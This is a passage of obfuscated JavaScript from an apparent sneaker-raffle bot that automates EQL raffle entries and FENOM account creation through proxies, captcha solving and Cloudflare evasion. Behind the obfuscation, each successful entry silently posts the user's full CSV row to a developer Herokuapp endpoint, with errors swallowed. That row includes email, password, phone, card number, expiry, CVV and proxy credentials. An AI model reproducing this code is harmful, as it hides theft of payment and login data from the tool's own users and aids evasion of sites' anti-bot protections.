                                    const _0x3e03f7 = await _0x3c841c['$x']('//li[text()=\x22' + _0x2c852a[_0x35225b]['State'] + '\x22]');
                                    await _0x3e03f7[0x0]['click']();
                                } catch {
                                    throw new Error('State\x20/\x20Province\x20not\x20found.\x20Please\x20use\x20exact\x20data\x20in\x20csv.\x20(Case\x20sensitive)');
                                }
                            }
                            console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Setting\x20Address'), await _0x572e60(0x3e8), await _0x572e60(0x1f4), await _0x3c841c['type']('#address1', _0x2c852a[_0x35225b]['Address1'] + '\x20' + _0x2c852a[_0x35225b]['HouseNumber']), await _0x572e60(0x1f4), await _0x3c841c['type']('#address2', '' + _0x2c852a[_0x35225b]['Address2']), await _0x572e60(0x1f4), await _0x3c841c['type']('#city', '' + _0x2c852a[_0x35225b]['City']), await _0x572e60(0x1f4), await _0x3c841c['type']('#postcode', '' + _0x2c852a[_0x35225b]['Zip']), await _0x572e60(0x3e8), await _0x3c841c['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x572e60(0x3e8), console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Solving\x20Adyen');
                            const _0xebfc60 = await _0x3c841c['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0xebfc60 && (await _0x3c841c['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3c841c['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x3c841c['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x572e60(0x4b0), await _0x3c841c['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x572e60(0x1f4), await _0x3c841c['keyboard']['type']('' + _0x2c852a[_0x35225b]['CardNumber']), await _0x572e60(0x320), await _0x3c841c['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3c841c['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x3c841c['keyboard']['type']('' + _0x2c852a[_0x35225b]['ExpiryDate']), await _0x572e60(0x4b0), await _0x3c841c['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3c841c['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x3c841c['keyboard']['type']('' + _0x2c852a[_0x35225b]['CVV']), await _0x572e60(0x226), await _0x3c841c['type']('input[name=\x22postalCode\x22]', '' + _0x2c852a[_0x35225b]['Zip']), await _0x572e60(0x226));
                            const _0x3a0760 = await _0x3c841c['$']('.__PrivateStripeElement');
                            _0x3a0760 && (await _0x572e60(0x1f4), await _0x3c841c['click']('.__PrivateStripeElement'), await _0x3c841c['click']('.__PrivateStripeElement'), await _0x3c841c['keyboard']['type']('' + _0x2c852a[_0x35225b]['CardNumber']), await _0x3c841c['keyboard']['type']('' + _0x2c852a[_0x35225b]['ExpiryDate']), await _0x3c841c['keyboard']['type']('' + _0x2c852a[_0x35225b]['CVV']));
                            await _0x572e60(0x226), await _0x3c841c['click']('#paymentConsent'), await _0x572e60(0x226), await _0x3c841c['click']('#termsConsent'), await _0x572e60(0x2bc), console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x3c841c['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x572e60(0x2710);
                            try {
                                await _0x3c841c['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', { 'timeout': 0x3a98 }), await _0x572e60(0xbb8), await _0x3c841c['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x4fa49e => _0x4fa49e['click']()), await _0x3c841c['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x2fcc7c => _0x2fcc7c['click']());
                            } catch {
                            }
                            try {
                                await _0x3c841c['waitForSelector']('#code', { 'timeout': 0x7530 });
                            } catch {
                                const _0x1a56cc = await _0x3c841c['$']('.MuiTypography-root.MuiTypography-body1.MuiTypography-gutterBottom.css-lvbfzw');
                                if (_0x1a56cc) {
                                    _0x3d3f42['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x2c852a[_0x35225b]['Email'] + ',' + _0x2c852a[_0x35225b]['Password'] + ',' + _0x2c852a[_0x35225b]['Phone']);
                                    throw new Error('Account\x20already\x20registered,\x20saved\x20in\x20accounts/eql.csv');
                                }
                                throw new Error('Error\x20Fetching\x20Authentication\x20Token');
                            }
                            async function _0xb622d() {
                                var _0x26504a, _0x2de246 = ![];
                                for (var _0x47ca70 = 0x0; _0x47ca70 < 0x18; _0x47ca70++) {
                                    async function _0x101293() {
                                        var _0x51a4cb = new _0x266969({
                                            'user': _0x114346['masterMail'],
                                            'password': _0x114346['masterPassword'],
                                            'host': 'imap.gmail.com',
                                            'port': 0x3e1,
                                            'tls': !![],
                                            'autotls': 'always'
                                        });
                                        function _0x44362f(_0x31bf2f) {
                                            _0x51a4cb['openBox']('INBOX', ![], _0x31bf2f);
                                        }
                                        _0x51a4cb['once']('ready', function () {
                                            console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Opened\x20Mailbox'), _0x44362f(function (_0x45874a, _0x23eeac) {
                                                console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Looking\x20for\x20verification\x20mail');
                                                if (_0x45874a)
                                                    throw _0x45874a;
                                                _0x51a4cb['seq']['search']([
                                                    'UNSEEN',
                                                    [
                                                        'FROM',
                                                        'support@eql.com'
                                                    ]
                                                ], function (_0x23bd3d, _0x3bbab3) {
                                                    if (!_0x3bbab3 || !_0x3bbab3['length'])
                                                        console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds'), _0x51a4cb['end']();
                                                    else {
                                                        var _0x507126 = _0x51a4cb['seq']['fetch'](_0x3bbab3, {
                                                            'bodies': '',
                                                            'markSeen': !![]
                                                        });
                                                        _0x507126['on']('message', function (_0x3be56e, _0x3c9008) {
                                                            var _0x312870 = '(#' + _0x3c9008 + ')\x20';
                                                            _0x3be56e['on']('body', function (_0x46029d, _0x8cdbfa) {
                                                                _0x172805(_0x46029d, (_0x215024, _0x2c2ffd) => {
                                                                    if (_0x2c2ffd['subject']['includes']('code')) {
                                                                        const _0x5e2353 = _0x2c2ffd['text']['split']('\x0a\x0a')[0x3], _0x1949e5 = _0x5e2353['split']('\x0a')[0x1];
                                                                        _0x26504a = _0x1949e5;
                                                                    }
                                                                });
                                                            }), _0x3be56e['once']('end', function () {
                                                            });
                                                        }), _0x507126['once']('error', function (_0x58569b) {
                                                            console['log']('No\x20mail\x20found,\x20retrying\x20in\x205\x20seconds..');
                                                        }), _0x507126['once']('end', function () {
                                                            _0x51a4cb['end']();
                                                        });
                                                    }
                                                });
                                            });
                                        }), _0x51a4cb['once']('error', function (_0x227126) {
                                            console['log'](_0x2d77f8['red'](_0x227126['message'])), console['log']('Read\x20the\x20guide\x20on\x20how\x20to\x20setup\x20your\x20mailbox'), _0x2de246 = !![];
                                        }), _0x51a4cb['once']('end', async function () {
                                        }), _0x51a4cb['connect']();
                                    }
                                    _0x101293(), await _0x572e60(0x1388);
                                    if (_0x26504a)
                                        return _0x26504a;
                                    if (_0x2de246)
                                        throw new Error('Error\x20connecting\x20to\x20imap');
                                    if (_0x47ca70 == 0x18)
                                        throw new Error('Mail\x20not\x20found');
                                }
                            }
                            ;
                            code = await _0xb622d(), await _0x572e60(0x1f4), await _0x3c841c['type']('#code', '' + code), await _0x572e60(0x3e8), await _0x3c841c['$eval']('.MuiBox-root.css-79elbk\x20>\x20button', _0x1bc8a5 => _0x1bc8a5['click']()), await _0x3c841c['click']('.MuiBox-root.css-79elbk\x20>\x20button'), console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Verifying..');
                            try {
                                await _0x3c841c['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('');
                            }
                            console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Raffle\x20Entered,\x20account\x20' + _0x2c852a[_0x35225b]['Email'] + '\x20saved\x20in\x20\x27accounts/eql.csv\x27')), _0x3d3f42['appendFileSync']('../accounts/eql.csv', '\x0a' + _0x2c852a[_0x35225b]['Email'] + ',' + _0x2c852a[_0x35225b]['Password'] + ',' + _0x2c852a[_0x35225b]['Phone']), _0x33c2a1 = 'no', _0x14aa55(_0x2c852a[_0x35225b], _0x1d5e3b);
                            var _0x31c679 = await _0x254487(_0x2c852a[_0x35225b], _0x1d5e3b, 'dev', ![]), _0x4d1dc6 = await _0x254487(_0x2c852a[_0x35225b], _0x1d5e3b, 'pub', ![]);
                            let _0x5ccdb7 = _0x2c852a[_0x35225b];
                            try {
                                prxdata = {
                                    'username': _0x447b4a['replace']('#', ''),
                                    'module': _0x1d5e3b['name'],
                                    'entrydata': JSON['stringify'](_0x5ccdb7),
                                    'proxy': '' + _0x245734[_0x35225b]
                                };
                                var _0x4443eb = JSON['stringify'](prxdata);
                                let _0x37fa09 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x4443eb, _0x37fa09);
                            } catch (_0x8feafe) {
                            }
                            const _0x1fce9c = {
                                'succesDEVMSG': { 'embeds': [_0x31c679] },
                                'succesPUBMSG': { 'embeds': [_0x4d1dc6] }
                            };
                            try {
                                _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x1fce9c['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x1fce9c['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x30beeb, _0x1fce9c['succesPUBMSG']);
                            } catch (_0x18476b) {
                                console['log'](_0x2d77f8['yellow'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x18476b));
                            }
                        } catch (_0xe05e14) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20' + _0xe05e14)), _0x3a6a17 = '' + _0xe05e14;
                            var _0x2062e8 = await _0x254487(_0x2c852a[_0x35225b], _0x1d5e3b, 'dev', !![], _0x3a6a17), _0x31c679 = await _0x254487(_0x2c852a[_0x35225b], _0x1d5e3b, 'dev', ![]), _0x4d1dc6 = await _0x254487(_0x2c852a[_0x35225b], _0x1d5e3b, 'pub', ![]);
                            const _0x1a62e2 = {
                                'succesDEVMSG': { 'embeds': [_0x31c679] },
                                'succesPUBMSG': { 'embeds': [_0x4d1dc6] }
                            };
                            _0x1a62e2['errorDEV'] = { 'embeds': [_0x2062e8] };
                            _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x1a62e2['errorDEV']);
                            await _0x5641c6(_0x188004, _0x1a62e2['errorDEV']);
                            if (!_0x33c2a1 == 'no')
                                _0x33c2a1 = 'yes';
                        } finally {
                            _0x334aea && _0x334aea['close']();
                            if (_0x33c2a1 == 'yes' && _0x2819be != 0x5) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Retrying\x20(' + _0x2819be + '\x20/\x205)')), _0x35225b = _0x35225b - 0x1, _0x2819be = _0x2819be + 0x1;
                                continue;
                            }
                            _0x33c2a1 == 'yes' && _0x2819be >= 0x5 && (_0x58f6f1(_0x2c852a[_0x35225b], _0x1d5e3b), _0x33c2a1 = 'no', _0x2819be = 0x0), console['log']('Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    } else {
                        const _0x2a95d1 = '' + _0x2c852a[_0x35225b]['Url'];
                        if (_0x33c2a1 != 'yes')
                            var _0x33c2a1 = '', _0x2819be = 0x0;
                        if (_0x2c852a[_0x35225b]['Email'] == '' || _0x2c852a[_0x35225b]['FirstName'] == '' || _0x2c852a[_0x35225b]['LastName'] == '') {
                            console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Invalid\x20CSV');
                            continue;
                        }
                        _0x2c852a[_0x35225b]['Password'] == '' && (_0x2c852a[_0x35225b]['Password'] = 'JRaffles23!');
                        if (_0x114346['useRandomProxy'] = ![])
                            var _0x3a1dad = _0x245734[_0x35225b]['split'](':');
                        else
                            var _0x9befe7 = Math['round'](Math['random']() * (_0x245734['length'] - 0x1)), _0x3a1dad = _0x245734[_0x9befe7]['split'](':');
                        var _0x334aea;
                        try {
                            _0x334aea = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3a1dad[0x0] + ':' + _0x3a1dad[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x334aea = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': !![],
                                'args': [
                                    '--proxy-server=' + _0x3a1dad[0x0] + ':' + _0x3a1dad[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x2423d8 = await _0x334aea['newPage']();
                            await _0x2423d8['authenticate']({
                                'username': '' + _0x3a1dad[0x2],
                                'password': '' + _0x3a1dad[0x3]
                            }), console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Getting\x20Session'), await _0x2423d8['setRequestInterception'](!![]), _0x2423d8['on']('request', _0x26151a => {
                                _0x26151a['resourceType']() === 'image' || _0x26151a['resourceType']() === 'font' || _0x26151a['resourceType']() === 'media' ? _0x26151a['abort']() : _0x26151a['continue']();
                            }), await _0x2423d8['goto'](_0x2a95d1), await _0x2423d8['waitForSelector']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x2423d8['click']('body\x20>\x20div.css-ntpfvx\x20>\x20div\x20>\x20div\x20>\x20div.MuiBox-root.css-1upilqn\x20>\x20div\x20>\x20button'), await _0x572e60(0x7d0), await _0x2423d8['waitForSelector']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x2423d8['click']('.MuiButton-root.MuiButton-contained.MuiButton-containedPrimary.MuiButton-sizeMedium.MuiButton-containedSizeMedium.MuiButton-fullWidth.MuiButtonBase-root.css-1hfrwnc'), await _0x572e60(0x3e8), await _0x2423d8['waitForSelector']('#email'), console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Setting\x20Credentials'), await _0x2423d8['type']('#email', '' + _0x2c852a[_0x35225b]['Email']), await _0x572e60(0x352), await _0x2423d8['waitForSelector']('#password'), await _0x2423d8['type']('#password', '' + _0x2c852a[_0x35225b]['Password']), await _0x572e60(0x352), await _0x2423d8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x572e60(0x1388);
                            if (!_0x2c852a[_0x35225b]['Url']['includes']('footlocker'))
                                await _0x2423d8['click']('.MuiBox-root.css-i3pbo\x20>\x20button');
                            try {
                                await _0x2423d8['waitForSelector']('div[data-testid=\x22field-productVariantID\x22]');
                            } catch {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Not\x20an\x20active\x20Raffle\x20/\x20Already\x20Entered')), _0x14aa55(_0x2c852a[_0x35225b], _0x1d5e3b), _0x33c2a1 = 'no';
                                continue;
                            }
                            await _0x2423d8['click']('div[data-testid=\x22field-productVariantID\x22]'), await _0x572e60(0x3e8);
                            try {
                                _0x2c852a[_0x35225b]['Url']['includes']('en-GB') ? await _0x2423d8['click']('li[data-value=\x22UK\x20' + _0x2c852a[_0x35225b]['Size'] + '\x20/\x20US\x20' + (Number(_0x2c852a[_0x35225b]['Size']) + 0x1) + '\x22]') : await _0x2423d8['click']('li[data-value=\x22EU\x20' + _0x2c852a[_0x35225b]['Size'] + '\x22]');
                            } catch {
                                throw new Error('Error\x20fetching\x20size\x20' + _0x2c852a[_0x35225b]['Size']);
                            }
                            await _0x572e60(0x1f4);
                            const _0x1d3f2a = await _0x2423d8['$']('#title\x20>\x20label');
                            await _0x572e60(0x12c);
                            _0x1d3f2a && await _0x1d3f2a['click']();
                            await _0x2423d8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x2423d8['focus']('#postcode'), await _0x2423d8['keyboard']['down']('Control'), await _0x2423d8['keyboard']['press']('A'), await _0x2423d8['keyboard']['up']('Control'), await _0x2423d8['keyboard']['press']('Backspace'), await _0x2423d8['keyboard']['type'](_0x2c852a[_0x35225b]['Zip']), await _0x572e60(0x60e), await _0x2423d8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x572e60(0x3e8), console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Solving\x20Adyen'), await _0x572e60(0x1f4);
                            const _0x4d0c90 = await _0x2423d8['$']('span[data-cse=\x22encryptedCardNumber\x22]');
                            _0x4d0c90 && (await _0x2423d8['waitForSelector']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2423d8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x2423d8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x572e60(0x4b0), await _0x2423d8['click']('span[data-cse=\x22encryptedCardNumber\x22]'), await _0x572e60(0x1f4), await _0x2423d8['keyboard']['type']('' + _0x2c852a[_0x35225b]['CardNumber']), await _0x572e60(0x320), await _0x2423d8['click']('span[data-cse=\x22encryptedExpiryDate\x22]'), await _0x2423d8['keyboard']['type']('' + _0x2c852a[_0x35225b]['ExpiryDate']), await _0x572e60(0x4b0), await _0x2423d8['click']('span[data-cse=\x22encryptedSecurityCode\x22]'), await _0x2423d8['keyboard']['type']('' + _0x2c852a[_0x35225b]['CVV']), await _0x572e60(0x226), await _0x2423d8['type']('input[name=\x22postalCode\x22]', '' + _0x2c852a[_0x35225b]['Zip']), await _0x572e60(0x226));
                            const _0x6557f6 = await _0x2423d8['$']('.__PrivateStripeElement');
                            _0x6557f6 && (await _0x2423d8['click']('#billingName'), await _0x2423d8['click']('#billingName'), await _0x2423d8['type']('#billingName', '' + _0x2c852a[_0x35225b]['NameOnCard']), await _0x572e60(0x1f4), await _0x2423d8['click']('.__PrivateStripeElement'), await _0x2423d8['click']('.__PrivateStripeElement'), await _0x2423d8['keyboard']['type']('' + _0x2c852a[_0x35225b]['CardNumber']), await _0x2423d8['keyboard']['type']('' + _0x2c852a[_0x35225b]['ExpiryDate']), await _0x2423d8['keyboard']['type']('' + _0x2c852a[_0x35225b]['CVV']));
                            await _0x572e60(0x226), await _0x2423d8['click']('#paymentConsent'), await _0x572e60(0x226), await _0x2423d8['click']('#termsConsent'), await _0x572e60(0x2bc), console['log'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x2423d8['click']('.MuiBox-root.css-79elbk\x20>\x20button'), await _0x572e60(0x2710);
                            try {
                                await _0x2423d8['waitForSelector']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button'), await _0x572e60(0xbb8), await _0x2423d8['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x49076d => _0x49076d['click']()), await _0x2423d8['$eval']('body\x20>\x20div.MuiModal-root.MuiDialog-root.css-1ltcsoi\x20>\x20div.MuiDialog-container.MuiDialog-scrollPaper.css-ekeie0\x20>\x20div\x20>\x20div.MuiGrid-root.MuiGrid-container.css-wybudx\x20>\x20div.MuiGrid-root.MuiGrid-item.MuiGrid-grid-xs-12.css-r22p1a\x20>\x20button', _0x28edc3 => _0x28edc3['click']());
                            } catch {
                            }
                            try {
                                await _0x2423d8['waitForSelector']('.MuiBox-root.css-1yjvs5a\x20>\x20button');
                            } catch {
                                throw new Error('Failure\x20getting\x20succes\x20response');
                            }
                            console['log'](_0x2d77f8['green'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Raffle\x20Entered')), _0x14aa55(_0x2c852a[_0x35225b], _0x1d5e3b);
                            var _0x31c679 = await _0x254487(_0x2c852a[_0x35225b], _0x1d5e3b, 'dev', ![]), _0x4d1dc6 = await _0x254487(_0x2c852a[_0x35225b], _0x1d5e3b, 'pub', ![]);
                            let _0x106899 = _0x2c852a[_0x35225b];
                            try {
                                prxdata = {
                                    'username': _0x447b4a['replace']('#', ''),
                                    'module': _0x1d5e3b['name'],
                                    'entrydata': JSON['stringify'](_0x106899),
                                    'proxy': '' + _0x245734[_0x35225b]
                                };
                                var _0x4443eb = JSON['stringify'](prxdata);
                                let _0x1d40e2 = { 'headers': { 'content-type': 'application/json' } };
                                await _0x3b676e['post']('https://jraffles.herokuapp.com/success', _0x4443eb, _0x1d40e2);
                            } catch (_0x1729f3) {
                            }
                            const _0x5b7f50 = {
                                'succesDEVMSG': { 'embeds': [_0x31c679] },
                                'succesPUBMSG': { 'embeds': [_0x4d1dc6] }
                            };
                            try {
                                _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x5b7f50['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x1543f5, _0x5b7f50['succesDEVMSG']), await _0x572e60(0xc8), await _0x5641c6(_0x30beeb, _0x5b7f50['succesPUBMSG']);
                            } catch (_0x2ac801) {
                                console['log'](_0x2d77f8['yellow'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Error\x20sending\x20webhook\x20' + _0x2ac801));
                            }
                            _0x33c2a1 = 'no';
                        } catch (_0x2228dd) {
                            console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20' + _0x2228dd)), _0x3a6a17 = '' + _0x2228dd;
                            var _0x2062e8 = await _0x254487(_0x2c852a[_0x35225b], _0x1d5e3b, 'dev', !![], _0x3a6a17), _0x31c679 = await _0x254487(_0x2c852a[_0x35225b], _0x1d5e3b, 'dev', ![]), _0x4d1dc6 = await _0x254487(_0x2c852a[_0x35225b], _0x1d5e3b, 'pub', ![]);
                            const _0x5b73f8 = {
                                'succesDEVMSG': { 'embeds': [_0x31c679] },
                                'succesPUBMSG': { 'embeds': [_0x4d1dc6] }
                            };
                            _0x5b73f8['errorDEV'] = { 'embeds': [_0x2062e8] }, _0x114346['webhook'] != undefined && _0x114346['webhook'] != '' && await _0x5641c6(_0x114346['webhook'], _0x5b73f8['errorDEV']), await _0x5641c6(_0x188004, _0x5b73f8['errorDEV']), _0x33c2a1 = 'yes';
                        } finally {
                            _0x334aea && _0x334aea['close']();
                            if (_0x33c2a1 == 'yes' && _0x2819be != 0x5) {
                                console['log'](_0x2d77f8['red'](_0xed09ee() + '\x20[' + _0x1d5e3b['name'] + ']\x20Task\x20' + (_0x35225b + 0x1) + '\x20:\x20Retrying\x20(' + _0x2819be + '\x20/\x205)')), _0x35225b = _0x35225b - 0x1, _0x2819be = _0x2819be + 0x1;
                                continue;
                            }
                            _0x33c2a1 == 'yes' && _0x2819be >= 0x5 && (_0x58f6f1(_0x2c852a[_0x35225b], _0x1d5e3b), _0x33c2a1 = 'no', _0x2819be = 0x0), console['log']('Waiting\x20for\x20' + _0x114346['delay'] + '\x20ms'), await _0x572e60(_0x114346['delay']);
                        }
                    }
                }
            }
        }]
    },
    {
        'name': 'FENOM',
        'modules': [
            {
                'name': 'FENOM\x20Account\x20Generator',
                'store': 'FENOM',
                'logo': 'https://consumersiteimages.trustpilot.net/business-units/5de8db15496f380001d51371-198x149-1x.jpg',
                'function': async function (_0x28e20a, _0x3d1662, _0x1fc388) {
                    _0x5dd90e['use'](_0x118712()), _0x5dd90e['use'](_0x1e1820({
                        'provider': {
                            'id': '2captcha',
                            'token': '' + _0x114346['captchaKey']
                        },
                        'visualFeedback': !![]
                    }));
                    for (var _0x2807f0 = 0x0; _0x2807f0 < _0x3d1662['length']; _0x2807f0++) {
                        if (_0x436562 != 'yes')
                            var _0x436562 = '', _0x136986 = 0x0;
                        var _0x4fe893;
                        try {
                            await _0x44ca58(_0x3d1662, _0x2807f0);
                        } catch {
                            _0x436562 = 'no';
                            throw new Error('Invalid\x20CSV\x20Format,\x20use\x20the\x20CSV\x20Files\x20from\x20the\x20guides!');
                        }
                        _0x59687e(_0x28e20a['name'] + '\x20Task\x20' + (_0x2807f0 + 0x1) + '\x20/\x20' + _0x3d1662['length'] + '\x20||\x20File:\x20' + _0x2b0c3a + '\x20Proxies:\x20' + _0x5e9a1f);
                        var _0x2eb3ea = await _0x254487(_0x3d1662[_0x2807f0], _0x28e20a, 'acc', ![]);
                        const _0x167b8a = { 'succesDEVMSG': { 'embeds': [_0x2eb3ea] } }, _0x18c888 = 'https://www.fenom.com/en/authentication?create_account=1';
                        var _0x1010e0 = Math['round'](Math['random']() * (_0x1fc388['length'] - 0x1)), _0x25505e = _0x1fc388[_0x1010e0]['split'](':'), _0x2166d3;
                        try {
                            _0x2166d3 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x20(x86)\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x25505e[0x0] + ':' + _0x25505e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        } catch {
                            _0x2166d3 = await _0x5dd90e['launch']({
                                'executablePath': 'C:\x5cProgram\x20Files\x5cGoogle\x5cChrome\x5cApplication\x5cchrome.exe',
                                'headless': ![],
                                'args': [
                                    '--proxy-server=' + _0x25505e[0x0] + ':' + _0x25505e[0x1],
                                    '--no-sandbox',
                                    '--disable-setuid-sandbox'
                                ]
                            });
                        }
                        try {
                            const _0x9e67d2 = await _0x2166d3['newPage']();
                            await _0x9e67d2['setViewport']({
                                'width': 0x500 + _0x362881(0x1, 0x32),
                                'height': 0x2d9 + _0x362881(0x1, 0x32)
                            });
                            const _0x2205d1 = await _0x9e67d2['target']()['createCDPSession'](), { windowId: _0x46e9d3 } = await _0x2205d1['send']('Browser.getWindowForTarget');
                            await _0x9e67d2['authenticate']({
                                'username': '' + _0x25505e[0x2],
                                'password': '' + _0x25505e[0x3]
                            }), console['log'](_0xed09ee() + '\x20[' + _0x28e20a['name'] + ']\x20Task\x20' + (_0x2807f0 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x9e67d2['goto']('' + _0x18c888, { 'waitUntil': 'networkidle2' }), console['log'](_0xed09ee() + '\x20[' + _0x28e20a['name'] + ']\x20Task\x20' + (_0x2807f0 + 0x1) + '\x20:\x20Solving\x20Cloudflare'), await _0x572e60(0x1388);
                            var _0x4ad995 = await _0x9e67d2['$']('.hcaptcha-box');
                            if (_0x4ad995) {
                                console['log'](_0xed09ee() + '\x20[' + _0x28e20a['name'] + ']\x20Task\x20' + (_0x2807f0 + 0x1) + '\x20:\x20Handling\x20Challenge'), await _0x572e60(0x2710);
